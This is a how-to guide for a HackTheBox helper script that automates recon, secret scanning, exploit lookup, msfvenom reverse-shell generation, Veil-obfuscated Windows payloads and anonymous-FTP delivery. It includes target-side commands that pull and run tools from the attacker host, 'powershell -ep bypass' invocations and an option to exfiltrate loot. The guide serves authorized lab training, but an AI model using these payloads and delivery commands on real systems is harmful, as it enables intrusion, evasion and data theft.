# htb-setup.sh — How-To Guide

A beginner-friendly guide to `htb-setup.sh`, a helper script that sets up an
Ubuntu/Debian host for HackTheBox and automates the repetitive parts of a box:
tooling, workspace, recon, web attack-surface triage, and privilege-escalation
analysis.

> **Authorized use only.** Everything here is for HackTheBox lab targets or
> systems you own and have explicit permission to test. Scanning or attacking
> anything else is illegal.

---

## Contents
- [What you get](#what-you-get)
- [First-time setup](#first-time-setup)
- [The commands](#the-commands)
  - [menu](#menu)
  - [install](#install)
  - [tools](#tools)
  - [peass](#peass)
  - [doctor](#doctor)
  - [workspace](#workspace)
  - [recon](#recon)
  - [websurface](#websurface)
  - [secrets](#secrets)
  - [exploits](#exploits)
  - [roothound](#roothound)
  - [ftp](#ftp)
  - [shell](#shell)
  - [flags](#flags)
  - [vpn](#vpn)
- [End-to-end walkthrough](#end-to-end-walkthrough)
- [Files & folders it creates](#files--folders-it-creates)
- [Configuration (environment variables)](#configuration-environment-variables)
- [Troubleshooting](#troubleshooting)

---

## What you get

`htb-setup.sh` is one script with several sub-commands. In a typical session you:

1. Install your toolset once (`install`).
2. Spin up a folder for the box you're attacking (`workspace`) — it also adds the
   box to `/etc/hosts` and offers to kick off recon immediately.
3. Let **AutoRecon** map the box while a **web attack-surface analyzer** runs
   alongside it, flagging login forms, file uploads, and other exploitable inputs.
   When recon finishes, a **secret scanner** sweeps the discovered web content for
   credentials, tokens, and keys, and an **exploit matcher** checks the
   fingerprinted services against Exploit-DB for known exploits.
4. After you get a shell, run **linPEAS** on the target, upload its output back,
   and **RootHound** automatically turns it into a "shell → root" graph.

Companion files that ship alongside the script:

- `tools.txt` — the list of Git tools to auto-install (AutoRecon, PEASS-ng, RootHound).
- `htb-methodology-cheatsheet.md` — the quick-reference attack workflow.
- `htb-setup-howto.md` — this document.

---

## First-time setup

```bash
# 1. Make the script executable
chmod +x htb-setup.sh

# 2. Put the tools list where the script looks for it
mkdir -p ~/htb
cp tools.txt ~/htb/tools.txt

# 3. Install everything (needs sudo)
./htb-setup.sh install

# 4. Confirm the toolset is present
./htb-setup.sh doctor
```

Run with a user that has `sudo` — `install`, `/etc/hosts` edits, and the VPN all
need root.

---

## The commands

**New here? Just run `./htb-setup.sh` with no arguments** and you'll get an
interactive menu that walks you through the next steps (install, connect VPN,
new box, recon, scan, exploit, deliver tools, privesc). Pick a number and it
prompts for anything it needs. Every option below can also be run directly as a
subcommand. Run `./htb-setup.sh help` any time for the summary.

### menu

**What it does:** the interactive "what next?" guide, shown automatically when you
run the script with no arguments (or explicitly with `./htb-setup.sh menu`). It
groups the workflow into Setup / Attack a box / Post-exploitation and prompts for
any values (IP, box name, file paths) a chosen action needs, then loops back for
the next step. Choose `0` to quit. Options that take over the terminal (VPN,
FTP server) end the menu when you launch them.

Each selection is announced before it runs and confirmed when it finishes, so you
always know what's happening:

```
[*] ▶ Running: Hunt for secrets
    ... command output ...
[*] ✔ Finished: Hunt for secrets — returning to menu.
```

```bash
./htb-setup.sh          # launches the menu
./htb-setup.sh menu     # same thing, explicitly
```


### install

**What it does:** installs the core pentest toolset and then pulls the Git tools
listed in `tools.txt`.

- Installs via `apt` (one by one, so a single unavailable package doesn't abort
  the run): nmap, ffuf, gobuster, nikto, sqlmap, hydra, john, hashcat, masscan,
  smbclient, enum4linux, openvpn, proxychains4, python3/pipx, inotify-tools, and more.
- Clones **SecLists** to `/usr/share/seclists` and unpacks `rockyou.txt`.
- Installs **Exploit-DB** (`searchsploit`) — from apt, or git-cloned to
  `/opt/exploitdb` on distros where apt doesn't carry it.
- Installs **Metasploit** (`metasploit-framework`, provides `msfvenom`) and
  **Veil** where the packages are available (preinstalled on the Pwnbox). Veil
  still needs a one-time `veil --setup` before first use.
- Installs Python tools (e.g. impacket) via `pipx`, and `pyftpdlib` (for the
  `ftp` delivery server) via `pip`.
- Runs [`tools`](#tools) to fetch the Git repos in `tools.txt`, then
  [`peass`](#peass) to download the precompiled winPEAS/linPEAS binaries.

```bash
./htb-setup.sh install
```

### tools

**What it does:** clones and auto-installs tools from Git URLs, either from
`~/htb/tools.txt` or from URLs you pass on the command line. Everything lands in
`~/htb/tools/`.

It auto-detects how to install each repo:

| Repo contains | Action |
|---------------|--------|
| `pyproject.toml` / `setup.py` | `pipx install .` |
| `requirements.txt` | creates a `.venv` and installs deps |
| `go.mod` | `go build ./...` |
| `Makefile` | `make` |
| only shell scripts (e.g. PEASS-ng) | `chmod +x` and reports the path |

```bash
./htb-setup.sh tools                                   # use ~/htb/tools.txt
./htb-setup.sh tools https://github.com/Tib3rius/AutoRecon   # or pass URLs
```

**Tools shipped in `tools.txt`:**

- **AutoRecon** (`Tib3rius/AutoRecon`) — multi-threaded automated recon.
- **PEASS-ng** (`peass-ng/PEASS-ng`) — LinPEAS/WinPEAS privesc enumeration scripts.
  The git clone gives you `linPEAS/linpeas.sh` (ready to run) and the winPEAS
  *source* — but **not** the compiled `winPEAS*.exe`. For those, use the
  [`peass`](#peass) command, which downloads the precompiled binaries.
- **RootHound** (`Noz2/RootHound`) — turns linPEAS output into a visual
  "low-priv shell → root" attack-path graph.

To add your own, just add a line to `~/htb/tools.txt` (one Git URL per line;
`#` comments and blank lines are ignored).

### peass

**What it does:** downloads the **latest precompiled PEASS binaries** from the
PEASS-ng GitHub Releases into a delivery folder (default `~/htb/serve/peass`), so
they're ready to serve to a box. This fills the gap left by the git clone, which
ships winPEAS source but not the compiled executables.

By default it grabs: `winPEASx64.exe`, `winPEASx86.exe`, `winPEASany.exe`,
`winPEAS.bat`, `linpeas.sh`, and `linpeas_small.sh`. It always resolves the newest
release via the GitHub API, so you're not pinned to a stale version.

```bash
./htb-setup.sh peass                 # into ~/htb/serve/peass
./htb-setup.sh peass ~/htb/blue/www  # into a specific folder
```

It also runs automatically at the end of `install`. Combine it with the
[`ftp`](#ftp) server to deliver to a box:

```bash
./htb-setup.sh peass
./htb-setup.sh ftp ~/htb/serve/peass
# then on the target:
#   Windows: (New-Object Net.WebClient).DownloadFile('ftp://<you>/winPEASx64.exe','C:\Windows\Temp\wp.exe')
#   Linux:   wget ftp://<you>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
```

### doctor

**What it does:** checks that the expected tools and wordlists are present and
tells you what's missing.

```bash
./htb-setup.sh doctor
```

### workspace

**What it does:** sets up a per-box working directory and gets you ready to attack.

Specifically it:

1. Prompts for the **box name** (if you didn't pass one) — used for the directory.
2. Prompts for the **box IP** (if you didn't pass one).
3. Adds `<ip>  <box>.htb` to **`/etc/hosts`** (replacing any stale entry).
4. Creates `~/htb/<box>/` with subfolders `nmap/ enum/ exploit/ loot/ www/ autorecon/`.
5. Writes a `notes.md` template (ports table, creds table, foothold/privesc sections).
6. Prompts: **"Run AutoRecon against `<ip>` now? [y/N]"** — yes launches recon.

```bash
./htb-setup.sh workspace blue            # will prompt for the IP
./htb-setup.sh workspace blue 10.10.10.40   # IP supplied up front
```

### recon

**What it does:** the built-in recon pipeline (used as a fallback if AutoRecon
isn't installed, or run directly). Output goes to `~/htb/<box>/nmap/`.

Stages: fast all-ports TCP sweep → service/version + default-script scan on the
open ports → if web ports are open, `nikto` + `ffuf` directory brute force → if
SMB is open, `smbclient` + `enum4linux`.

```bash
./htb-setup.sh recon 10.10.10.40 blue
```

### websurface

**What it does:** fetches web pages and flags elements that are common
exploitation entry points, writing a report to `~/htb/<box>/web-attack-surface.txt`.

It runs **automatically in parallel with AutoRecon** (when you accept the recon
prompt), analyzing each URL AutoRecon discovers. You can also run it standalone.

It flags:

- **File uploads** — `type=file` / `multipart/form-data` → test webshell upload.
- **Login forms** — password fields → test default/weak creds, SQLi auth bypass, brute force.
- **Username/email fields** — possible auth or user-enumeration surface.
- **POST forms** — data submission → test SQLi / command injection / SSTI (reports the form `action`).
- **Suspicious parameters** — names like `cmd`, `file`, `url`, `redirect` → RCE/LFI/SSRF hints.
- **Server-side script targets** — forms posting to `.php` / `.asp` / `.jsp` / `.cgi` / `.py`.

```bash
./htb-setup.sh websurface 10.10.10.40 blue
```

### secrets

**What it does:** crawls the box's web content and scans it for sensitive data —
credentials, tokens, API keys, and secrets — then alerts you and writes a report
to `~/htb/<box>/secrets-report.txt`.

**Why this instead of Burp?** This is the "find valuable information" job people
usually reach for Burp to do. Burp Suite *Community* (the free edition) has no
API and can't be scripted, so its scanner can't be automated. This command
covers the high-value part directly and works on any box — no Burp needed. (If
you later get Burp *Professional*, its REST API could drive full active scans;
ask and we can add that.)

**How it works:** starting from the box's web ports (and any URLs AutoRecon
already discovered), it crawls same-host links to a small depth, fetches HTML,
JavaScript, and JSON, and scans each response body, HTTP header, cookie, and
HTML comment. Findings are de-duplicated and ranked by severity.

**What it detects:**

| Severity | Examples |
|----------|----------|
| CRITICAL | Private keys (RSA/EC/OpenSSH), AWS access/secret keys |
| HIGH | Google/Slack/GitHub tokens, JWTs, Bearer tokens, basic-auth-in-URL, `password=`/`api_key=`/`token=`/`db_password=` style assignments |
| MEDIUM | HTML comments mentioning passwords, users, TODO/FIXME, backdoor/debug |
| LOW | Hidden form field values (often CSRF/session tokens) |
| INFO | Email addresses (useful for username lists) |

```bash
./htb-setup.sh secrets 10.10.10.40 blue
# tune the crawl:
SECRETS_DEPTH=3 SECRETS_MAX_PAGES=80 ./htb-setup.sh secrets 10.10.10.40 blue
```

It also runs **automatically as the final step of the AutoRecon flow**, once
enough URLs have been discovered. Each hit lists the URL, the matched string, and
surrounding context so you can verify it — regex matches can have false positives,
so always confirm before acting.

### exploits

**What it does:** takes the services AutoRecon fingerprinted (product + version)
and looks them up in the local **Exploit-DB** via `searchsploit` — completely
offline — then alerts you to known exploits, mapped to each port/service.
Output goes to `~/htb/<box>/exploits-report.txt`.

**How it works:** it parses the nmap XML from `~/htb/<box>/autorecon/` (and the
built-in `nmap/` output), pulls each open service's product and version, and
queries searchsploit most-specific-first: `product version` → `product major.minor`
→ `product`. It stops at the first query that returns hits, so you get the
tightest match available.

Each result shows the Exploit-DB ID and title, plus ready-to-run commands:

```
=== 80/tcp  Apache httpd 2.4.49  (http) ===  1 exploit(s)
   EDB-50383: Apache 2.4.49 - Path Traversal & RCE
      view: searchsploit -x 50383   copy: searchsploit -m 50383
```

- `searchsploit -x <id>` opens the exploit to read it.
- `searchsploit -m <id>` copies it into your current directory.

```bash
./htb-setup.sh exploits blue        # run against a box you've already recon'd
```

It also runs **automatically at the end of the AutoRecon flow**. Requires
`exploitdb` (installed by `install`; on non-Kali Ubuntu the script git-clones it
to `/opt/exploitdb` if apt doesn't have it).

> **Reality check:** a version match is *not* proof of vulnerability — the
> service may be patched/back-ported, or the exploit may need conditions the box
> doesn't meet. Treat these as leads to investigate, and always read the exploit
> (`searchsploit -x`) before running anything.

### roothound

**What it does:** watches box `loot/` folders and, as soon as a **linPEAS output
file** is uploaded, automatically runs **RootHound** to produce a privilege-
escalation attack-path graph at `~/htb/<box>/roothound-report.html`.

Three modes:

```bash
./htb-setup.sh roothound                     # watch ALL boxes' loot/ dirs (recommended)
./htb-setup.sh roothound blue                # watch just one box
./htb-setup.sh roothound /path/to/linpeas.txt   # one-shot on a file you already have
```

In watch mode it monitors `~/htb/*/loot/` (picking up boxes you create later),
detects which files are actually linPEAS output, and drops each report in the
matching box folder. With `inotify-tools` installed detection is instant;
otherwise it polls every 5 seconds.

**The privesc loop:**
```bash
# on the target (after you get a shell):
./linpeas.sh | tee linpeas.txt
# back on your host — upload into the box's loot folder:
scp linpeas.txt you@ATTACKER:~/htb/blue/loot/
# roothound (already watching) fires automatically -> roothound-report.html
```

### ftp

**What it does:** starts an **anonymous FTP server** on your attacking host so a
foothold shell on the box can pull your tools/executables. This is the classic
"stage your payloads, then grab them from the target" workflow.

- Serves a directory (default `~/htb/serve`) over FTP with anonymous login.
- **Read-only by default** (the box downloads from you). Set `FTP_WRITE=1` to also
  allow the box to *upload* to you — useful for pulling loot back out.
- **Configurable bind** via a 3rd argument or `FTP_BIND` (see below).
- Lists your available interfaces and prints ready-to-paste pickup commands for
  both Linux and Windows targets, using the bind/display IP.

**Bind options** — the route to the target isn't always the tunnel (e.g. on the
**HackTheBox ParrotOS Pwnbox** the target may be reachable over a different
interface), so you can choose:

| Value | Meaning |
|-------|---------|
| `auto` (default) | `tun0` if present, else your primary host IP |
| `all` | bind every interface (`0.0.0.0`) |
| `<iface>` | bind a named interface's IP, e.g. `eth0`, `tun0`, `ens160` |
| `<ip>` | bind an explicit IP address |

```bash
./htb-setup.sh ftp                            # auto bind, serve ~/htb/serve on :21
./htb-setup.sh ftp ~/htb/blue/www 2121 eth0   # serve a dir on :2121, bound to eth0
./htb-setup.sh ftp ~/htb/serve 21 all         # bind all interfaces (Pwnbox-friendly)
FTP_BIND=10.10.14.7 ./htb-setup.sh ftp        # bind a specific IP via env
FTP_WRITE=1 ./htb-setup.sh ftp                # also allow the box to upload back to you
```

The interactive menu also prompts for the bind target when you start the server.

Then, from the shell you got on the box:

```bash
# Linux target:
wget ftp://<YOUR-VPN-IP>/linpeas.sh -O /tmp/linpeas.sh
# Windows target (PowerShell):
(New-Object Net.WebClient).DownloadFile('ftp://<YOUR-VPN-IP>/nc.exe','C:\Windows\Temp\nc.exe')
```

Requires `pyftpdlib` (installed by `install`; or `pip3 install --break-system-packages pyftpdlib`).
Port 21 needs root, so the script uses `sudo` automatically for privileged ports.

> **Safety:** anonymous FTP is unauthenticated — anyone who can reach the port can
> read (and, in write mode, write) your `serve/` folder. Prefer the narrowest bind
> that still reaches the target (a specific interface/IP rather than `all`), only
> put payloads meant for the target in `serve/`, and stop it (Ctrl-C) when done.

### shell

**What it does:** suggests and generates reverse-shell payloads with **msfvenom**,
saving them into your delivery folder (default `~/htb/serve`) and printing the
matching listener command. Run with no type for an interactive picker, or name a
type directly.

The picker is two steps: first choose the **target / format** (Windows exe, ASPX,
PowerShell, Linux ELF, PHP, WAR, Python, Bash), then choose the **kind of shell**:

- **Command shell** — a raw OS shell (`cmd.exe` / `/bin/sh`), caught with `netcat`.
- **Meterpreter** — a full Metasploit session, caught with `multi/handler`.

(Bash only supports a plain command shell, so it skips the second prompt.)

- **LHOST auto-detects** (`tun0`, else primary IP); override with `LHOST=` env or
  the 2nd argument. **LPORT** defaults to `4444` (env `LPORT=` or 3rd argument).
- Prints the exact `msfvenom` command **whether or not msfvenom is installed**, so
  it doubles as a cheat sheet.
- Stageless shells print a **netcat** listener; meterpreter payloads print the
  **Metasploit multi/handler** command.

Direct keywords (for non-interactive use) — most formats have a plain and a
Meterpreter (`-met`) variant:

| Keyword | Payload | Output | Listener |
|---------|---------|--------|----------|
| `windows-exe` / `windows-met` | `windows/x64/{shell,meterpreter}_… ` | `.exe` | nc / msf |
| `aspx` / `aspx-met` | `windows/x64/{shell,meterpreter}_…` | `.aspx` | nc / msf |
| `powershell` / `powershell-met` | `windows/x64/{shell,meterpreter}_…` | `.ps1` | nc / msf |
| `linux-elf` / `linux-met` | `linux/x64/{shell,meterpreter}_…` | `.elf` | nc / msf |
| `php` / `php-met` | `php/reverse_php` · `php/meterpreter/reverse_tcp` | `.php` | nc / msf |
| `war` / `war-met` | `java/jsp_shell_reverse_tcp` · `java/meterpreter/reverse_tcp` | `.war` | nc / msf |
| `python` / `python-met` | `python/{shell,meterpreter}_…` | `.py` | nc / msf |
| `bash` | `cmd/unix/reverse_bash` | `.sh` | nc |

```bash
./htb-setup.sh shell                          # interactive picker
./htb-setup.sh shell linux-elf 10.10.14.7     # generate a Linux ELF shell
./htb-setup.sh shell windows-met 10.10.14.7 443
LHOST=10.10.14.7 ./htb-setup.sh shell php
```

**Optional Veil-obfuscated variant (Windows only).** Pass a 4th argument or set
`SHELL_VEIL=1` (the picker also asks) to *additionally* generate a
[Veil](https://github.com/Veil-Framework/Veil)-obfuscated payload alongside the
msfvenom one. The two are named so you can tell them apart:

- `shell-win-x64-msf.exe` — the plain msfvenom payload
- `shell-win-x64-veil.exe` — the Veil-obfuscated payload (a Go meterpreter,
  so use a `multi/handler`, which the tool prints)

```bash
./htb-setup.sh shell windows-exe 10.10.14.7 4444 1     # both payloads
SHELL_VEIL=1 ./htb-setup.sh shell windows-met 10.10.14.7
```

Veil is a standard packaged framework — the script only calls its CLI. It's
Windows-exe focused (the variant is skipped for non-Windows types), and its
first-time setup is heavy: `sudo apt install -y veil && veil --setup` (pulls
Wine/Go/Python). Override the Veil payload with `VEIL_PAYLOAD=`.

> **Reality check on evasion:** HTB target boxes don't run AV/EDR, so obfuscation
> isn't needed to solve them — the Veil option is there to *learn* how evasion
> works. Stock msfvenom payloads and Veil's public templates are both widely
> signatured, so neither is a reliable bypass against real defended systems. Use
> only against systems you're authorized to test.

Typical flow — generate, start the listener, deliver, trigger:

```bash
./htb-setup.sh shell windows-exe 10.10.14.7 9001   # writes ~/htb/serve/shell-win-x64.exe
nc -lvnp 9001 &                                     # listener (as printed)
./htb-setup.sh ftp ~/htb/serve                      # deliver over FTP
# on the box: download shell-win-x64.exe and run it -> shell lands in your nc
```

Requires `msfvenom` (part of `metasploit-framework`, preinstalled on the HTB
ParrotOS Pwnbox; on plain Ubuntu install it from Rapid7's official package).

> **Note:** msfvenom's stock payloads are heavily signatured — great for HTB lab
> boxes, but expect AV/EDR to catch them elsewhere. Only use against systems you're
> authorized to test.

### flags

**What it does:** stages two flag-finder scripts into your delivery folder
(default `~/htb/serve`) — `find-flags.sh` (Linux) and `find-flags.ps1` (Windows) —
that you run **on the box** after getting a shell. Each searches the filesystem
for `user.txt` / `root.txt` (and `proof.txt`), printing the path and contents of
anything it finds, and flagging files that exist but aren't readable as your
current user (a hint that privesc is still needed).

```bash
./htb-setup.sh flags              # stage into ~/htb/serve
./htb-setup.sh ftp ~/htb/serve    # deliver over FTP
```

On the target:

```bash
# Linux:
wget ftp://<YOUR-IP>/find-flags.sh -O /tmp/ff.sh && bash /tmp/ff.sh
# or scope the search:  bash /tmp/ff.sh /home /root /opt

# Windows (PowerShell):
powershell -ep bypass -f find-flags.ps1
# or:  powershell -ep bypass -f find-flags.ps1 -Roots C:\Users,C:\inetpub
```

The Linux script uses `-xdev` to stay on one filesystem (fast, skips `/proc` and
mounts); pass explicit directories to narrow the search. The scripts are also
available standalone as `find-flags.sh` / `find-flags.ps1`.

### vpn

**What it does:** connects to a HackTheBox `.ovpn` profile.

```bash
./htb-setup.sh vpn ~/Downloads/lab_yourname.ovpn
# confirm your tunnel IP:
ip a show tun0
```

---

## End-to-end walkthrough

```bash
# One-time
chmod +x htb-setup.sh
cp tools.txt ~/htb/tools.txt
./htb-setup.sh install
./htb-setup.sh doctor

# Per box
./htb-setup.sh vpn lab.ovpn                 # (in one terminal) connect to HTB
./htb-setup.sh roothound                    # (in another terminal) start the privesc watcher
./htb-setup.sh workspace blue               # prompt IP -> /etc/hosts -> "Run AutoRecon? y"
#   AutoRecon maps the box; websurface flags web entry points in parallel.

# ... you find a foothold using the recon + web-surface findings, get a shell ...

# On the target:
./linpeas.sh | tee linpeas.txt
# Upload it back:
scp linpeas.txt you@ATTACKER:~/htb/blue/loot/
#   roothound auto-generates ~/htb/blue/roothound-report.html — follow a path to root.
```

Keep `~/htb/blue/notes.md` updated as you go; the cheatsheet explains the
methodology behind each phase.

---

## Files & folders it creates

```
~/htb/
├── tools.txt                     # your Git tools list
├── tools/                        # cloned tools (AutoRecon, PEASS-ng, RootHound, …)
├── serve/                        # default folder the `ftp` server shares to targets
│   ├── peass/                    # precompiled winPEAS/linPEAS binaries (from `peass`)
│   ├── find-flags.sh             # Linux flag finder (from `flags`)
│   └── find-flags.ps1            # Windows flag finder (from `flags`)
├── .roothound_done               # bookkeeping: linPEAS files already processed
└── <box>/                        # one per box (created by `workspace`)
    ├── notes.md                  # your running notes (template provided)
    ├── nmap/                     # built-in recon output
    ├── autorecon/                # AutoRecon output
    ├── enum/  exploit/  www/     # scratch space
    ├── loot/                     # drop uploaded files here (linPEAS, creds, etc.)
    ├── web-attack-surface.txt    # websurface findings
    ├── secrets-report.txt        # secrets scanner findings (creds/tokens/keys)
    ├── exploits-report.txt        # known exploits for fingerprinted services
    └── roothound-report.html     # privesc graph (once linPEAS is processed)
```

---

## Configuration (environment variables)

| Variable | Default | Purpose |
|----------|---------|---------|
| `HTB_ROOT` | `~/htb` | Base directory for all box workspaces |
| `TOOLS_DIR` | `$HTB_ROOT/tools` | Where Git tools are cloned |
| `TOOLS_LIST` | `$HTB_ROOT/tools.txt` | The Git tools list to read |
| `SECRETS_DEPTH` | `2` | How many link-hops the `secrets` crawler follows |
| `SECRETS_MAX_PAGES` | `40` | Max pages the `secrets` crawler fetches |
| `FTP_BIND` | `auto` | FTP bind target: `auto` / `all` / `<iface>` / `<ip>` |
| `FTP_WRITE` | `0` | Set to `1` to allow the target to upload to your FTP server |
| `LHOST` / `LPORT` | auto / `4444` | Reverse-shell callback IP/port for `shell` |
| `SHELL_VEIL` | `0` | Set to `1` to also emit a Veil-obfuscated Windows payload |
| `VEIL_PAYLOAD` | `go/meterpreter/rev_tcp` | Veil payload used for the obfuscated variant |

Example: `HTB_ROOT=/data/htb ./htb-setup.sh workspace blue 10.10.10.40`

---

## Troubleshooting

- **"could not write /etc/hosts (need root?)"** — run with a `sudo`-capable user.
- **No open ports found in recon** — check the VPN is up (`ip a show tun0`) and
  that you're using the right IP; some boxes block ping, but the script already
  passes `-Pn`.
- **`roothound` never fires** — the file must actually be linPEAS output (it's
  detected by content), and must land in a `loot/` folder under `~/htb`. Install
  `inotify-tools` for instant detection instead of 5-second polling.
- **A Git tool didn't install** — open `~/htb/tools/<name>` and check its README;
  the auto-installer handles common layouts but not every project.
- **AutoRecon not found when recon starts** — run `./htb-setup.sh install` (or
  `./htb-setup.sh tools https://github.com/Tib3rius/AutoRecon`); the script falls
  back to built-in recon in the meantime.
